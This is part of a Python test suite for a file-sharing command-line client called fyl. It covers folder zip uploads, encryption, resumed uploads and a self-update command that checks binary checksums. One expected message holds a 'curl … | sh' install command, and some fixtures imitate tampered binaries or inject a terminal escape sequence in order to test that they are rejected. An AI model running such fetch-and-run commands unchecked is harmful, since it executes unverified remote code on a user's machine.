        self.assertEqual((self.root / 'fyl-{}'.format(UPLOAD_ID[:8])).read_bytes(), b'already here')
        # At a terminal a mistyped key may be typed again; the link of this file works as well as the key.
        result, shown, _ = self.run_pty(['decrypt', str(saved), '--endpoint', self.endpoint, '-o', str(self.root / 'typed')],
                                        [(KEY_PROMPT, b64url(os.urandom(32)) + '\r'), (KEY_PROMPT, link + '\r')])
        self.assertEqual((result.returncode, result.stderr, shown), (0, WRONG_KEY, (KEY_PROMPT + '\r\n') * 2))
        self.assertEqual((self.root / 'typed').read_bytes(), content)

    # ---------------------------------------------------------------------------------------------
    # Folders as one zip (docs/FOLDER-ZIP.md)

    def tree(self, name, base=None):
        """A tree vector of tests/vectors/folder-zip/ written to disk under `base` (default: the home folder)."""
        vector = json.loads((FOLDER_VECTORS / '{}.json'.format(name)).read_text())
        return vector, Path(os.fsdecode(folder_zip.materialise(vector['tree'], vector['root'], str(base or self.root))))

    def stored(self):
        """The bytes the fake stored for the upload, its parts in order."""
        return b''.join(self.state.blobs[n] for n in sorted(self.state.blobs))

    def readers_accept(self, data, names):
        """Python's zipfile and, where installed, Info-ZIP's unzip -t open the zip and find exactly these entries."""
        with zipfile.ZipFile(io.BytesIO(data)) as opened:
            self.assertIsNone(opened.testzip())
            self.assertEqual([info.filename for info in opened.infolist()], names)
        if shutil.which('unzip'):
            path = Path(self.tmp.name) / 'check.zip'
            path.write_bytes(data)
            result = subprocess.run(['unzip', '-tq', str(path)], capture_output=True, text=True, timeout=60)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            path.unlink()

    def photos(self, big=0):
        """A folder of a few files, one of `big` random bytes if asked; returns the folder and its files' contents."""
        folder = self.folder('holiday photos')
        files = {'a.txt': b'first file\n', 'sub/b.bin': os.urandom(70_000), 'sub/deeper/c.txt': b'', '.hidden': b'kept'}
        if big:
            files['video.mov'] = os.urandom(big)
        for name, content in files.items():
            (folder / name).parent.mkdir(parents=True, exist_ok=True)
            (folder / name).write_bytes(content)
        return folder, {'holiday photos/' + name: content for name, content in files.items()}

    def test_a_folder_uploads_as_the_zip_of_the_vectors(self):
        skips = {'basic': 'fyl: Skipped 2 symlinks and 1 special file.\n', 'times': '',
                 'names': 'fyl: Skipped 10 files with an unsafe name and 2 folders with an unsafe name.\n'}
        for name, said in skips.items():
            with self.subTest(name):
                self.reset()
                vector, folder = self.tree(name, base=self.folder(name))
                result = self.run_cli(folder, '--json')
                self.assertEqual((result.returncode, result.stderr), (0, said), result.stderr)
                # Byte for byte the vector's zip, sent as `<root>.zip` with the zip's size; the server sees just a file.
                self.assertEqual(self.stored().hex(), vector['zip'])
                self.assertEqual((self.state.metadata['filename'], self.state.metadata['size']), (vector['root'] + '.zip', vector['size']))
                receipt = json.loads(result.stdout)
                self.assertEqual((receipt['name'], receipt['size'], receipt['folder']),
                                 (vector['root'] + '.zip', vector['size'], {'files': len(vector['entries']), 'skipped': len(vector['skipped'])}))
                self.readers_accept(self.stored(), [entry['path'] for entry in vector['entries']])
        # --verbose names every item left out, escaped, and says how many files went in.
        self.reset()
        _, folder = self.tree('basic', base=self.folder('verbose'))
        result = self.run_cli(folder, '--verbose')
        self.assertEqual(result.returncode, 0, result.stderr)
        for line in ['fyl: Skipped 2 symlinks and 1 special file.', '  skipped (symlink): link-to-a', '  skipped (special): pipe',
                     '  skipped (symlink): sub/link-to-dir', 'Prepared folder: 5 files', 'Uploading: photos.zip (0.00 MB in 1 parts) from 5 files']:
            self.assertIn(line + '\n', result.stderr)
        self.reset()
        _, folder = self.tree('names', base=self.folder('escaped'))
        result = self.run_cli(folder, '--verbose')
        self.assertIn('  skipped (name): line\\nbreak.txt\n', result.stderr)
        self.assertIn('  skipped (name): latin1-\\xe9.txt\n', result.stderr)
        self.assertNotIn('\x7f', result.stderr)

    def test_a_folder_round_trips_with_encryption_a_password_and_one_download(self):
        folder, files = self.photos(big=60 * 1024 * 1024)
        names = sorted(files, key=str.encode)
        result = self.run_cli(folder, '--encrypt', '--password', '--once', '--expires', '2h', '--workers', '2', env={'FYL_PASSWORD': 'tide-lamp-moss-41'})
        self.assertEqual((result.returncode, result.stderr), (0, ''), result.stderr)
        link, _ = self.keyed(result.stdout)
        # Two parts of ciphertext; neither the folder's name nor its files' reached the server.
        self.assertEqual(len(self.state.blobs), 2)
        wire = b''.join(self.state.wire)
        for secret in (b'holiday photos', b'a.txt', b'first file', files['holiday photos/video.mov'][:32]):
            self.assertNotIn(secret, wire)
        out = self.folder('received')
        got = self.download(link, '-o', str(out), env={'FYL_PASSWORD': 'tide-lamp-moss-41'})
        self.assertEqual((got.returncode, got.stdout, got.stderr), (0, '{}\n'.format(out / 'holiday photos.zip'), ''))
        data = (out / 'holiday photos.zip').read_bytes()
        self.readers_accept(data, names)
        with zipfile.ZipFile(io.BytesIO(data)) as opened:
            self.assertEqual({name: opened.read(name) for name in names}, files)
        # Exactly what the reference implementation builds from the same folder.
        entries, _ = folder_zip.collect(folder)
        self.assertEqual(data, folder_zip.zip_bytes(entries))
        # One download only: the link is used up.
        again = self.download(link, '-o', str(self.folder('again')), env={'FYL_PASSWORD': 'tide-lamp-moss-41'})
        self.assertEqual(again.returncode, 1, again.stderr)

    def test_an_interrupted_folder_upload_resumes_unless_the_folder_changed(self):
        folder, _ = self.photos(big=60 * 1024 * 1024)
        self.state.failures = {'/part': [200, 503, 503, 503]}
        first = self.run_cli(folder, '--workers', '1')
        self.assertEqual((first.returncode, first.stdout), (1, ''))
        command, value = self.resume_command(first.stderr)
        # The value ends in the folder's fingerprint (§9), which the reference implementation computes too.
        entries, _ = folder_zip.collect(folder)
        self.assertEqual(value, '{}.{}.{}'.format(UPLOAD_ID, resume_token(self.state.metadata['clientKey']), folder_zip.fingerprint(entries)))
        self.assertIn("| fyl '{}' --resume -".format(folder), command)
        # Touched, the folder gives another zip: refused before anything is read or sent, and nothing cancelled.
        video, sent = folder / 'video.mov', len(self.state.requests)
        times = video.stat()
        os.utime(video, ns=(times.st_atime_ns, times.st_mtime_ns + 5_000_000_000))
        refused = self.rerun(command)
        self.assertEqual((refused.returncode, refused.stdout, refused.stderr), (2, '', FOLDER_CHANGED))
        (folder / 'new.txt').write_bytes(b'one more')
        os.utime(video, ns=(times.st_atime_ns, times.st_mtime_ns))
        refused = self.rerun(command)
        self.assertEqual((refused.returncode, refused.stdout, refused.stderr), (2, '', FOLDER_CHANGED))
        self.assertEqual(self.state.requests[sent:], [])
        # Back as it was, it resumes: part 1 is checked, part 2 sent, and the stored zip is the folder's.
        (folder / 'new.txt').unlink()
        resumed = self.rerun(command)
        self.assertEqual((resumed.returncode, resumed.stdout), (0, LINK + '\n'), resumed.stderr)
        self.assertEqual(self.paths()[sent:].count('/part'), 1)
        self.assertEqual(self.paths().count('/abort'), 0)
        self.assertEqual(self.stored(), folder_zip.zip_bytes(entries))
        # A file's value doesn't resume a folder.
        self.assertEqual(self.run_cli(folder, '--resume', value.rsplit('.', 1)[0]).returncode, 2)

    def test_an_interrupted_encrypted_folder_upload_resumes_with_its_fingerprint(self):
        folder, files = self.photos(big=60 * 1024 * 1024)
        self.state.failures = {'/part': [200, 503, 503, 503]}
        first = self.run_cli(folder, '--encrypt', '--workers', '1')
        self.assertEqual((first.returncode, first.stdout), (1, ''))
        command, value = (line.strip() for line in first.stderr.strip().splitlines()[-2:])
        entries, _ = folder_zip.collect(folder)
        self.assertRegex(value, r'^{}\.[A-Za-z0-9_-]{{43}}\.[A-Za-z0-9_-]{{43}}\.{}$'.format(UPLOAD_ID, re.escape(folder_zip.fingerprint(entries))))
        self.assertTrue(command.endswith(" --resume - --encrypt --workers 1 --endpoint '{}'".format(self.endpoint)), command)
        # Renamed, the folder gives other paths in the zip.
        renamed = folder.with_name('renamed')
        folder.rename(renamed)
        refused = self.rerun(command.replace(str(folder), str(renamed)), input=value + '\n')
        self.assertEqual((refused.returncode, refused.stderr), (2, FOLDER_CHANGED))
        renamed.rename(folder)
        resumed = self.rerun(command, input=value + '\n')
        self.assertEqual(resumed.returncode, 0, resumed.stderr)
        link, _ = self.keyed(resumed.stdout)
        got = self.download(link, '-o', str(self.folder('received')))
        self.assertEqual(got.returncode, 0, got.stderr)
        self.assertEqual((self.root / 'received' / 'holiday photos.zip').read_bytes(), folder_zip.zip_bytes(entries))

    def test_a_file_that_changes_during_a_folder_upload_stops_it_before_completing(self):
        folder, _ = self.photos(big=60 * 1024 * 1024)
        # After part 1 the video, which part 2 still needs, changes.
        self.state.mutate = folder / 'video.mov'
        result = self.run_cli(folder, '--workers', '1')
        self.assertEqual((result.returncode, result.stdout, result.stderr),
                         (1, '', 'fyl: A file in the folder changed while it was uploaded. Start a new upload.\n'))
        self.assertNotIn('/complete', self.paths())
        self.assertFalse(self.state.completed)

    def test_folders_that_cannot_go_as_one_zip_are_refused_before_anything_is_sent(self):
        refusals = json.loads((FOLDER_VECTORS / 'refusals.json').read_text())
        clash = refusals['trees'][0]
        folder = Path(os.fsdecode(folder_zip.materialise(clash['tree'], clash['root'], str(self.folder('clash')))))
        result = self.run_cli(folder)
        self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', 'fyl: Two items in the folder would get the same name: clash/a.txt.\n'))
        # A file and a folder that get the same name once a bidi control is dropped: `clash/a` and `clash/a/b.txt`.
        prefix = next(case for case in refusals['trees'] if case['name'] == 'prefix')
        folder = Path(os.fsdecode(folder_zip.materialise(prefix['tree'], prefix['root'], str(self.folder('prefix')))))
        result = self.run_cli(folder)
        self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', 'fyl: Two items in the folder would get the same name: clash/a.\n'))
        nothing = self.folder('nothing/only/folders')
        (nothing / 'link').symlink_to('/etc/hostname')
        result = self.run_cli(self.root / 'nothing')
        self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', 'fyl: Skipped 1 symlink.\nfyl: The folder has no files to send.\n'))
        # A byte over 50 GiB as a zip (the cargo tests take the exact limits from tests/vectors/folder-zip/refusals.json);
        # with E2EE the limit is P_max.
        big = self.folder('max')
        for size, args in [(50 * 1024 ** 3 - 249, ()), (53_673_987_000 - 249, ('--encrypt',))]:
            with open(big / 'a.bin', 'wb') as sparse:
                sparse.truncate(size)
            result = self.run_cli(big, *args)
            self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', 'fyl: The folder makes a zip larger than 50 GB.\n'), args)
        self.assertEqual(self.state.requests, [])
        # Unreadable: the run stops with the path, before anything is sent.
        if os.geteuid() != 0:
            folder, _ = self.photos()
            (folder / 'sub').chmod(0)
            try:
                result = self.run_cli(folder)
            finally:
                (folder / 'sub').chmod(0o755)
            self.assertEqual((result.returncode, result.stdout), (2, ''))
            self.assertRegex(result.stderr, r"^fyl: Can't read '.*/holiday photos/sub': Permission denied \(os error 13\)\.\n$")
            self.assertEqual(self.state.requests, [])

    def test_a_folder_shows_its_preparation_on_a_terminal_only(self):
        folder, _ = self.photos()
        result, shown = self.on_terminal([str(folder), '--endpoint', self.endpoint])
        self.assertEqual((result.returncode, result.stdout), (0, LINK + '\n'))
        # The line counts the files, then clears itself: a quiet run ends with nothing else on the terminal.
        self.assertTrue(shown.startswith('\rPreparing folder… '), shown)
        self.assertIn('Preparing folder… 4/4 files', shown)
        self.assertTrue(shown.endswith('\r\x1b[K'), shown)

    # ---------------------------------------------------------------------------------------------
    # Updates: the notice after a command, and fyl update (docs/CLI.md)

    def offer(self, version, files=None):
        """The fake's /cli/version.json names `version` (and `files`, binary name to SHA-256)."""
        index = {'name': 'fyl', 'version': version, 'path': '/cli/{}/'.format(version), 'files': files or {}}
        self.state.cli['/cli/version.json'] = json.dumps(index).encode()

    def test_a_newer_version_is_noticed_once_a_day_on_a_terminal_only(self):
        file, cache = self.fixture(), self.root / 'cache'
        stamp, on = cache / 'fyl' / 'update-check', {'FYL_NO_UPDATE_CHECK': '', 'XDG_CACHE_HOME': str(cache)}
        self.offer('9.9.9')
        result, shown = self.on_terminal([str(file), '--endpoint', self.endpoint], env=on)
        # One line on stderr; stdout keeps only the link.
        self.assertEqual((result.returncode, result.stdout, shown), (0, LINK + '\n', 'fyl 9.9.9 is available: run fyl update\r\n'))
        self.assertEqual(self.state.cli_requests, ['/cli/version.json'])
        # The only state: the time of the check.
        self.assertEqual(os.listdir(cache / 'fyl'), ['update-check'])
        self.assertRegex(stamp.read_text(), r'^[0-9]{10}\n$')
        self.assertLessEqual(abs(int(stamp.read_text()) - time.time()), 60)
        # Within a day it isn't asked again, after any command.
        for args in ([str(file), '--endpoint', self.endpoint], ['download', '{}/d/{}'.format(self.origin, UPLOAD_ID), '--endpoint', self.endpoint,
                                                                 '-o', str(self.root / 'copy.zip')]):
            result, shown = self.on_terminal(args, env=on)
            self.assertEqual((result.returncode, shown), (0, ''), result.stderr)
        self.assertEqual(len(self.state.cli_requests), 1)
        # A day later it is; this very version, or one the server garbles or doesn't have, is said nothing about.
        for index in (json.dumps({'name': 'fyl', 'version': VERSION}).encode(), b'{"name": "fyl", "version": "9.9.9\\u001b[2J"}', b'<html>', None):
            stamp.write_text('{}\n'.format(int(time.time()) - 86_400))
            self.state.cli.pop('/cli/version.json', None)
            if index is not None:
                self.state.cli['/cli/version.json'] = index
            result, shown = self.on_terminal([str(file), '--endpoint', self.endpoint], env=on)
            self.assertEqual((result.returncode, result.stdout, shown), (0, LINK + '\n', ''), index)
        self.assertEqual(len(self.state.cli_requests), 5)
        # Never when stderr isn't a terminal, FYL_NO_UPDATE_CHECK=1 or CI is set, or the command failed.
        self.offer('9.9.9')
        shutil.rmtree(cache)
        piped = self.run_cli(file, env=on)
        self.assertEqual((piped.returncode, piped.stderr), (0, ''))
        for env, args in [({'FYL_NO_UPDATE_CHECK': '1'}, [str(file)]), ({'CI': 'true'}, [str(file)]), ({}, [str(self.root / 'missing')])]:
            result, shown = self.on_terminal([*args, '--endpoint', self.endpoint], env={**on, **env})
            self.assertNotIn('available', shown, env)
        self.assertEqual((len(self.state.cli_requests), cache.exists()), (5, False))
        # Nor after fyl decrypt, which works offline.
        vector = next(v for v in json.loads((VECTORS / 'cross' / 'rust.json').read_text())['vectors'] if v.get('ciphertext'))
        (self.root / 'sealed.age').write_bytes(bytes.fromhex(vector['ciphertext']))
        result, shown = self.on_terminal(['decrypt', str(self.root / 'sealed.age'), '--endpoint', self.endpoint], env={**on, 'FYL_KEY': vector['ageIdentity']})
        self.assertEqual((result.returncode, result.stdout, shown), (0, '{}\n'.format(self.root / 'sealed'), ''))
        self.assertEqual((len(self.state.cli_requests), cache.exists()), (5, False))
        # Without XDG_CACHE_HOME it is ~/.cache/fyl.
        result, shown = self.on_terminal([str(file), '--endpoint', self.endpoint], env={'FYL_NO_UPDATE_CHECK': ''})
        self.assertEqual(shown, 'fyl 9.9.9 is available: run fyl update\r\n')
        self.assertTrue((self.root / '.cache' / 'fyl' / 'update-check').is_file())

    def installed(self, name='install'):
        """A copy of fyl in a folder of its own, which fyl update may replace, and how to run its update."""
        copy = self.folder(name) / 'fyl'
        shutil.copy2(NATIVE, copy)

        def update(*args, env=None, via=None, umask=0o022):
            return subprocess.run([str(via or copy), 'update', '--endpoint', self.endpoint, *args], capture_output=True, text=True,
                                  env=self.environment(**(env or {})), timeout=60, stdin=subprocess.DEVNULL, umask=umask)
        return copy, update

    def release(self, version, binary=None, sums=None):
        """The fake publishes `binary` (default: a script that says it is fyl `version`) as this host's /cli/<version>/ binary,
        named with its SHA-256 by version.json and by SHA256SUMS (or `sums`)."""
        binary = binary or '#!/bin/sh\necho "fyl {}"\n'.format(version).encode()
        digest = hashlib.sha256(binary).hexdigest()
        self.offer(version, {HOST: digest, 'fyl-other-arch': '0' * 64})
        self.state.cli['/cli/{}/{}'.format(version, HOST)] = binary
        self.state.cli['/cli/{}/SHA256SUMS'.format(version)] = (sums if sums is not None else '{}  {}\n'.format(digest, HOST)).encode()
        return binary

    def test_update_replaces_this_fyl_with_the_checked_current_version(self):
        copy, update = self.installed()
        binary = self.release('9.9.9')
        check = update('--check')
        self.assertEqual((check.returncode, check.stdout, check.stderr), (0, 'fyl 9.9.9 is available (this is {}): run fyl update\n'.format(VERSION), ''))
        self.assertEqual((self.state.cli_requests, copy.read_bytes()), (['/cli/version.json'], NATIVE.read_bytes()))
        # Run through a symlink, as from a folder on the PATH: the file it points at is replaced, the link stays.
        link = self.bin / 'linked-fyl'
        link.symlink_to(copy)
        result = update(via=link)
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, 'Updated fyl {} to 9.9.9: {}\n'.format(VERSION, copy), ''))
        self.assertEqual(self.state.cli_requests[1:], ['/cli/version.json', '/cli/9.9.9/SHA256SUMS', '/cli/9.9.9/' + HOST])
        self.assertEqual((copy.read_bytes(), stat.S_IMODE(copy.stat().st_mode), link.is_symlink()), (binary, 0o755, True))
        self.assertEqual(os.listdir(copy.parent), ['fyl'])
        self.assertEqual(subprocess.run([str(link), '--version'], capture_output=True, text=True, timeout=10).stdout, 'fyl 9.9.9\n')
        # rwxr-xr-x under a strict umask too, which would make a new file 0700.
        shutil.copy2(NATIVE, copy)
        result = update(umask=0o077)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual((copy.read_bytes(), stat.S_IMODE(copy.stat().st_mode)), (binary, 0o755))

    def test_update_changes_nothing_it_cant_check(self):
        copy, update = self.installed()
        original = copy.read_bytes()
        # This very version: nothing to do. An older one: only with --force.
        self.offer(VERSION)
        for args, said in [((), 'fyl {} is already up to date.\n'), (('--check',), 'fyl {} is up to date.\n')]:
            result = update(*args)
            self.assertEqual((result.returncode, result.stdout, result.stderr), (0, said.format(VERSION), ''))
        self.release('0.9.0')
        for args in [(), ('--check',)]:
            result = update(*args)
            self.assertEqual(result.returncode, 1 if not args else 0, result.stderr)
        self.assertEqual(update().stderr, 'fyl: {} offers fyl 0.9.0, older than this fyl {}. Nothing was changed; fyl update --force installs it '
                                          'anyway.\n'.format(self.origin.split('//')[1], VERSION))
        self.assertEqual(copy.read_bytes(), original)
        # Downloads that don't match what the release names, or don't run as that version, never move in.
        cases = [
            (lambda: self.release('9.9.9', sums='{}  {}\n'.format('0' * 64, HOST)), 'The checksums of fyl 9.9.9 on {} disagree (version.json and SHA256SUMS). Nothing was changed.'),
            (lambda: self.release('9.9.9', sums=''), 'The checksums of fyl 9.9.9 on {} disagree (version.json and SHA256SUMS). Nothing was changed.'),
            (lambda: self.state.cli.update({'/cli/9.9.9/' + HOST: b'#!/bin/sh\necho "fyl 6.6.6"\n'}), 'The download did not match its checksum. Nothing was changed.'),
            (lambda: self.release('9.9.9', binary=b'#!/bin/sh\necho "fyl 6.6.6"\n'), 'The downloaded fyl does not run on this system as fyl 9.9.9. Nothing was changed.'),
            (lambda: self.release('9.9.9', binary=b'\x7fELF not this system'), 'The downloaded fyl does not run on this system as fyl 9.9.9. Nothing was changed.'),
            (lambda: self.offer('9.9.9', {'fyl-other-arch': '0' * 64}), '{} lists no binary of fyl 9.9.9 for this system. Nothing was changed.'),
            (lambda: self.state.cli.pop('/cli/9.9.9/' + HOST), 'The download broke off. Nothing was changed. Try again.'),
            (lambda: self.state.cli.clear(), 'Could not read the current version from {}. Try again later.'),
        ]
        for prepare, message in cases:
            self.release('9.9.9')
            prepare()
            result = update('--force')
            self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', 'fyl: {}\n'.format(message.format(self.origin.split('//')[1]))))
            self.assertEqual((copy.read_bytes(), os.listdir(copy.parent)), (original, ['fyl']), message)
        # A folder this user can't write to: what to do instead.
        if os.geteuid() != 0:
            self.release('9.9.9')
            copy.parent.chmod(0o555)
            try:
                result = update()
            finally:
                copy.parent.chmod(0o755)
            self.assertEqual((result.returncode, result.stdout, result.stderr),
                             (1, '', 'fyl: Can\'t write to {}. Run sudo fyl update, or install again: curl -fsSL {}/cli/install | sh\n'.format(copy.parent, self.origin)))
            self.assertEqual(copy.read_bytes(), original)
        # --force installs an older version too.
        self.release('0.9.0')
        result = update('--force')
        self.assertEqual((result.returncode, result.stdout), (0, 'Updated fyl {} to 0.9.0: {}\n'.format(VERSION, copy)), result.stderr)

    def test_update_is_a_command_unless_a_file_named_update_stands_alone(self):
        (self.root / 'update').write_bytes(b'fyl.at fixture')
        result = self.run_raw('update', '--endpoint', self.endpoint, cwd=self.root)
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, LINK + '\n', ''))
        self.assertEqual(self.state.metadata['filename'], 'update')
        self.offer(VERSION)
        result = self.run_raw('update', '--check', '--endpoint', self.endpoint, cwd=self.root)
        self.assertEqual((result.returncode, result.stdout), (0, 'fyl {} is up to date.\n'.format(VERSION)))
        for args, message in [(('update', 'x'), 'fyl: update takes no file or link.\n'), (('update', '--bogus'), 'fyl: unknown option --bogus for fyl update\n'),
                              (('update', '--check=1'), 'fyl: --check takes no value.\n')]:
            result = self.run_raw(*args, '--endpoint', self.endpoint)
            self.assertEqual((result.returncode, result.stdout), (2, ''))
            self.assertTrue(result.stderr.startswith(message), result.stderr)


class BinaryPathTests(unittest.TestCase):
    def test_a_missing_binary_fails_the_run_instead_of_skipping_it(self):
        # It used to read `OK (skipped=…)`, which looks like a pass at a glance.
        missing = ROOT / 'missing' / 'fyl'
        result = subprocess.run([sys.executable, '-m', 'unittest', 'test_cli.NativeClientTests.test_version_and_help'], cwd=ROOT / 'tests',
                                capture_output=True, text=True, timeout=60,
                                env={**os.environ, 'FYL_CLI_BINARY': str(missing), 'PYTHONDONTWRITEBYTECODE': '1'})
        self.assertNotEqual(result.returncode, 0, result.stderr)
        self.assertIn('native fyl binary missing: {}'.format(missing), result.stderr)
        self.assertNotIn('skipped', result.stderr)


if __name__ == '__main__':
    unittest.main()
